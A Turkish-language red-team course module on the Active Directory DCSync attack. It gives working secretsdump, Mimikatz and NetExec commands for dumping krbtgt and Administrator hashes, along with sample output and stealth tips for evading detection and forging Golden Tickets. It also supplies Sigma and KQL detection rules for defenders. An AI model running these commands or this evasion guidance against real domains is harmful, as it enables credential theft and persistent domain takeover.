## 1. Kavramsal Temel — Neden Var?

**DCSync**, bir Domain Controller'ı **taklit ederek**, gerçek bir DC'den başka bir DC'ye replikasyon istermiş gibi, herhangi bir hesabın (dahil **krbtgt** ve **Administrator**) parola hash'lerini **ağ üzerinden** talep eder. Kritik nokta: DCSync **LSASS'e dokunmaz, NTDS.dit'i kopyalamaz, DC'ye kod çalıştırmaz** — tamamen **meşru replikasyon protokolünü (MS-DRSR)** kullanır. Domain, bir DC'nin diğerinden veri istemesini normal işleyiş sayar; saldırgan da tam olarak bu güveni kötüye kullanır.

**Analoji:** Banka şubeleri gece hesap bakiyelerini birbirleriyle senkronize eder. DCSync, sahte bir şube kimliğiyle merkeze telefon edip "Ben Ankara şubesiyim, tüm müşteri parolalarını senkronizasyon için gönder" demektir. Merkez bunu rutin senkronizasyon sanır ve **krbtgt dahil** her şeyi verir.

**Neden domain hakimiyetinin dönüm noktası:** `krbtgt` hash'ini alırsan **[Golden Ticket](./09.2_Golden_Silver_Diamond_Sapphire_Ticket.md)** üretebilir, herhangi bir kullanıcı/grup olarak sınırsız TGT imzalayabilirsin. `Administrator` hash'iyle Pass-the-Hash yaparsın. DCSync, "domain admin oldum"dan "domain'i **kalıcı** olarak sahiplendim"e geçiştir.

**Kim yapabilir:** `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` uzatılmış haklarına (extended rights) sahip herhangi bir asıl. Varsayılan: Domain Admins, Enterprise Admins, Domain Controllers. Ama bir [ACL abuse](../Modul_05_Yetki_Yukseltme_ACL_ve_GPO/05.1_DACL_Abuse.md) ile sıradan bir kullanıcıya bu hak verilmişse (yaygın yanlış yapılandırma), o kullanıcı DCSync yapabilir.

## 2. Teknik Derinlik — MS-DRSR ve DsGetNCChanges

DCSync, dizin replikasyon RPC arayüzü **MS-DRSR**'ın (Directory Replication Service Remote) `IDL_DRSGetNCChanges` çağrısını kullanır:

```
 SALDIRGAN (repl. hakkı olan asıl)                    HEDEF DC
    │  DRSBind() → replikasyon oturumu aç         →   │  ← "bir DC bağlanıyor" (meşru)
    │  DsGetNCChanges(krbtgt DN, secret attrs)    →   │
    │                                                 │  hedef DC, krbtgt için:
    │  ← unicodePwd, ntPwdHistory, supplementalCreds  │   RC4(NT hash) + AES anahtarları döner
    │                                                 │
    ▼ hash'ler şifresi çözülür (session key ile)
```

**Talep edilen gizli nitelikler (secret attributes):**
| Nitelik | İçerik |
|---|---|
| `unicodePwd` | Güncel NT hash (RC4-HMAC anahtarı) |
| `ntPwdHistory` | Önceki NT hash'leri (parola geçmişi) |
| `supplementalCredentials` | Kerberos AES128/AES256 anahtarları, DES, clear-text (varsa) |
| `dBCSPwd` | LM hash (eski) |

**Şifreleme:** Hash'ler replikasyon oturumu **session key** ile şifrelenir (`RPC_SECURITY_QOS`), saldırgan aracı (Mimikatz/secretsdump) bunu şeffafça çözer. Yani ağda hash'ler açık gitmez ama saldırgan aracın kendisi çözer.

**Neden LSASS dump'tan üstün:** [LSASS dump](../Modul_03_Kimlik_Bilgisi_Erisimi/03.2_LSASS_Bellek_Dokumu.md) yalnızca o makinede **oturum açmış** hesapların kimliğini verir ve EDR'nin en çok izlediği yüzeydir. DCSync ise **her** hesabı verir (offline değil, canlı replikasyonla) ve DC'ye hiç kod çalıştırmaz — sadece hakka sahip olmak yeterlidir. Bu yüzden Tier-0 hedefinde tercih edilir.

**Tek net iz:** DsGetNCChanges çağrısı DC'de **4662** (nesne erişimi, replikasyon GUID'leri `1131f6aa-...`/`1131f6ad-...`) üretir. Bir DC olmayan asıl'ın bu çağrıyı yapması en güçlü tespittir → [Blue 10.2](../../2-Blue_Team/Modul_10_Olay_Mudahalesi_DFIR_ve_Kurtarma/10.2_KRBTGT_Cift_Reset_ve_Ticket_Gecersizlestirme.md).

**Üç uzatılmış hakkın anlamı (neden ikisi yeter):**
| Uzatılmış hak (GUID) | İşlev |
|---|---|
| `DS-Replication-Get-Changes` (`1131f6aa`) | Naming context'teki değişiklikleri oku |
| `DS-Replication-Get-Changes-All` (`1131f6ad`) | **Gizli nitelikleri** (parola) da al |
| `DS-Replication-Get-Changes-In-Filtered-Set` (`89e95b76`) | RODC filtreli set |

DCSync için **Get-Changes + Get-Changes-All** ikilisi şarttır; ilki olmadan replikasyon başlar ama parola nitelikleri gelmez. Bir [ACL abuse](../Modul_05_Yetki_Yukseltme_ACL_ve_GPO/05.1_DACL_Abuse.md) senaryosunda saldırgan tam olarak bu iki ACE'yi domain kökü nesnesine ekler → sıradan kullanıcı DCSync yapar.

**PEK/şifre çözüm zinciri (canlı):** Hedef DC, `unicodePwd`'ı replikasyon **session key** ile şifreleyip yollar; ama bu değer NTDS içinde **PEK (Password Encryption Key)** ile de şifrelidir. DC, DsGetNCChanges yanıtında değeri session-key katmanıyla sarar; secretsdump/Mimikatz bu dış katmanı çözer ve NT hash'i elde eder. Yani offline NTDS analizinden ([Red 09.4](./09.4_Skeleton_Key_ve_NTDS_Exfiltration.md)) farklı olarak, DCSync'te **BootKey/SYSTEM hive gerekmez** — DC çözümü kendisi yapıp verir.

## 3. Pratik Uygulama — Çok Araçlı

**A) Impacket secretsdump (uzaktan, en yaygın):**
```bash
# Sadece krbtgt (Golden Ticket için minimum iz)
impacket-secretsdump 'corp.local/dauser:Pass@dc01.corp.local' -just-dc-user krbtgt
# Tüm domain hash'leri (gürültülü)
impacket-secretsdump 'corp.local/dauser:Pass@dc01.corp.local' -just-dc
# Hash ile (PtH), DC hesabıyla (ESC8 sonrası)
impacket-secretsdump 'corp.local/DC01$@dc01' -hashes :<DC01$hash> -just-dc-user krbtgt
```

**B) Mimikatz (Windows, oturum içi):**
```
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /user:Administrator /csv
```

**C) NetExec (toplu + otomatik parse):**
```bash
nxc smb dc01.corp.local -u dauser -p Pass --ntds        # NTDS dökümü (drsuapi metodu)
nxc smb dc01.corp.local -u dauser -p Pass -M ntdsutil   # alternatif
```

**D) DCSync hakkını doğrulama (kim yapabilir):**
```powershell
# PowerView ile replikasyon haklarını kimin taşıdığını bul
Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs |
  ? { $_.ObjectAceType -match 'Replication-Get-Changes' } |
  Select SecurityIdentifier, ObjectAceType
```

**Örnek çıktı:**
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a59bc0ec0f4c3d5e...:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06...:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:5e0d...
```

**Gerçek-dünya zinciri:**
```
ACL abuse / ESC8 (DC hash) ──▶ DCSync krbtgt ──▶ Golden Ticket ──▶ istediğin an DA
        │                             │
        ▼                             ▼
   secretsdump -just-dc-user krbtgt   AES256 anahtarı da al (RC4 downgrade tespitinden kaç)
```

## 4. Bıraktığı İz ve Karşı Tespit

| Teknik | MITRE ATT&CK | Kaynak İz (IOC) | Karşı Blue |
|---|---|---|---|
| DCSync | **T1003.006** (OS Cred Dumping: DCSync) | 4662 replikasyon GUID (`1131f6aa/ad`); DC olmayan kaynaktan DsGetNCChanges | [Blue 10.2](../../2-Blue_Team/Modul_10_Olay_Mudahalesi_DFIR_ve_Kurtarma/10.2_KRBTGT_Cift_Reset_ve_Ticket_Gecersizlestirme.md) |
| Repl. ACL abuse | T1098 | 5136 ACE ekleme (Replication-Get-Changes) | [Blue 5.x](../../2-Blue_Team/Modul_05_Yetki_ve_ACL_Sikilastirma/) |
| krbtgt ele geçirme | T1558.001 | Sonraki Golden Ticket kullanımı | [Blue 10.2](../../2-Blue_Team/Modul_10_Olay_Mudahalesi_DFIR_ve_Kurtarma/10.2_KRBTGT_Cift_Reset_ve_Ticket_Gecersizlestirme.md) |

**OPSEC notları:**
- **En net iz:** 4662 içinde `Properties` alanında replikasyon uzatılmış hak GUID'leri (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` = Get-Changes, `1131f6ad-...` = Get-Changes-All) ve **kaynak asıl'ın bir DC hesabı OLMAMASI**. Blue tarafı "DC olmayan bir hesabın replikasyon çağrısı" kuralını avlar.
- **Minimum iz:** `-just-dc-user krbtgt` sadece bir hesap çeker → tek 4662, toplu dökümden çok daha sessiz. Tüm domain dökümü onlarca replikasyon çağrısı üretir.
- **AES anahtarını da al:** Sadece RC4 hash'iyle Golden Ticket üretmek `etype=RC4` anomalisi bırakır ([Blue 6.x](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/)); AES256 anahtarını da alırsan AES ticket üretip modern ortamda karışabilirsin.
- **Kurtarma tetiği:** DCSync tespit edilirse Blue **krbtgt'yi iki kez resetler** → tüm Golden Ticket'lar geçersiz. Bu yüzden krbtgt kalıcılığı "tespit edilene kadar" geçerlidir.
- **Kaynak host kısıtı:** Bazı olgun ortamlar replikasyonu **yalnızca DC IP'leri arasında** firewall/IPsec ile kısıtlar; bu durumda DCSync bir DC üzerinden (ör. ele geçirilmiş DC'de yerel çalıştırma) yapılmalı, saldırgan iş istasyonundan doğrudan çekilemez. Blue için "DC olmayan kaynaktan replikasyon" kuralı bu yüzden çok etkilidir.
- **Targeted vs full:** Tek kullanıcı (`-just-dc-user`) hedefli ve sessizdir; `-just-dc` tüm domain'i çeker ama onlarca 4662 üretir ve replikasyon trafiği hacmi anormaldir. Operasyonda **önce krbtgt + Administrator + 1-2 servis hesabı** hedeflenip durulur.

**Tespit mantığı (Blue bakışı):** En güvenilir kural şudur: *4662 içinde replikasyon uzatılmış hak GUID'i VAR + `SubjectUserName` bir DC makine hesabı DEĞİL*. Meşru replikasyon yalnızca DC'ler arasında olur; bir kullanıcı veya üye sunucudan gelen DsGetNCChanges neredeyse her zaman DCSync'tir. Ayrıca `DS-Replication-Get-Changes-All` ACE'sinin **kime verildiği** düzenli denetlenir ([Blue 5.x](../../2-Blue_Team/Modul_05_Yetki_ve_ACL_Sikilastirma/)).

## 5. Doğrulama / Lab

```bash
# Lab: DC + repl. hakkı verilmiş test kullanıcısı
# 1) impacket-secretsdump 'corp.local/test:Pass@dc01' -just-dc-user krbtgt
# 2) 4662 olayının test kullanıcısı + repl. GUID ile üretildiğini doğrula
# Blue doğrulama (DCSync avı):
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4662} |
  Where-Object { $_.Message -match '1131f6aa|1131f6ad' -and $_.Message -notmatch '\$' }
```

**Sigma kuralı (DC olmayan asıldan replikasyon):**
```yaml
title: DCSync - Replication Rights Used by Non-DC Account
logsource: { product: windows, service: security }
detection:
  selection:
    EventID: 4662
    Properties|contains:
      - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'  # DS-Replication-Get-Changes
      - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'  # Get-Changes-All
  filter_dc:
    SubjectUserName|endswith: '$'               # meşru DC makine hesapları
  filter_svc: { SubjectUserName: 'MSOL_*' }     # (varsa) Entra Connect senkron hesabı — ayrıca izlenmeli
  condition: selection and not (filter_dc or filter_svc)
level: critical
```

**KQL (Sentinel — DCSync + sonraki Golden korelasyonu):**
```kusto
SecurityEvent
| where EventID == 4662 and Properties has "1131f6ad"
| where AccountType != "Machine"
| project TimeGenerated, Account, Properties
```
Bu kural, [DACL abuse](../Modul_05_Yetki_Yukseltme_ACL_ve_GPO/05.1_DACL_Abuse.md) ile replikasyon hakkı kazanmış sıradan bir kullanıcının krbtgt çekmesini yakalar → hemen [krbtgt çift-reset](../../2-Blue_Team/Modul_10_Olay_Mudahalesi_DFIR_ve_Kurtarma/10.2_KRBTGT_Cift_Reset_ve_Ticket_Gecersizlestirme.md) tetiklenir.
